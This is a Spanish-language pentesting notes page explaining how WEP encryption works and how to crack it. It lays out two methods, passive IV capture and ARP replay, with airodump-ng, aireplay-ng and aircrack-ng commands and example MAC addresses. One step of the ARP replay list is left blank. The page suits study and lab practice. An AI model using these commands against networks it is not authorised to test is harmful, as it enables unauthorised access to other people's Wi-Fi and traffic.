# WEP

## Cómo funciona

Wired Equivalent Privacy (WEP) es un protocolo hoy en día obsoleto para conectar de manera inalámbrica dispositivos en una red lan. Funciona de la siguiente manera:

1. Un cliente quiere enviar un paquete de manera segura en la red, por lo que en conjunto con la **clave de la red** inalámbrica y un vector de inicialización **IV,** encriptará el contenido del mensaje.
2. El mensaje es enviado a través de la red junto con el IV en **texto plano**.
3. El receptor como ya tiene la contraseña, y ahora recibió el IV, podrá desencriptar los mensajes que le lleguen.

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

## Explotación

La forma de crackear WEP consta de dos pasos:

1. Capturar muchos paquetes con sus respectivos IV's.
2. Ya que solo al tener una longitud de 24bits los IV's se repetirán en algún momento, esto nos permitira crackear la contraseña.



### Método 1: Red con mucho tráfico

Este método se basa en la captura pasiva de paquetes para extraer su IV's, por lo que es clave que la red se esté utilizando, de lo contrario no se podrán conseguir los IV's necesarios para obtener la contraseña.

**Captura de los IV's:**

```
airodump-ng --bssid <bssid> --channel <n> --write <outfile> wlxd0374534e4d2
airodump-ng --bssid 5C:E2:8C:55:88:B8 --channel 6 --write wep_network wlxd0374534e4d2
```

**Crackeo de la contraseña:**

```
aircrack-ng <captura>.cap
```



### Método 2: ARP Replay

Este ataque viene a solucionar el problema del ataque anterior, si no tráfico en la red, no se generarán los suficientes IV's para crackearlos. Por lo que entra en juego el protocolo ARP para llevar a cabo este ataque, en el que se intercepta un paquete ARP legítimo de la red, solo que se modifica la dirección MAC de destino.

Pasos a seguir:

1. Se envía un paquete ARP al router víctima
2. El router lo captura y retransmite
3.
4. Estos paquetes están encriptados, por lo que son generados nuevos IV's
5. Con los IV's suficientes se puede obtener la contraseña

**Captura de los IV's:**

```bash
airodump-ng --bssid <bssid> --channel <n> --write <outfile> wlxd0374534e4d2
airodump-ng --bssid 5C:E2:8C:55:88:B8 --channel 6 --write wep_network wlxd0374534e4d2
```

**Asociar un cliente a la red:**

```bash
aireplay-ng --fakeauth 0 -a <bssid> -h <mac-monitor> <name-iface>
aireplay-ng --fakeauth 0 -a 5C:E2:8C:55:88:B8 -h 16:B4:A3:E9:C1:A1 wlxd0374534e4d2
```

**Generar paquetes ARP:**

```bash
aireplay-ng --arpreplay -b <bssid> -h <mac-monitor> <name-iface>
aireplay-ng --arpreplay -b 5C:E2:8C:55:88:B8 -h 16:B4:A3:E9:C1:A1 wlxd0374534e4d2
```

**Crackear IV's:**

```bash
aircrack-ng <captura>.cap
```

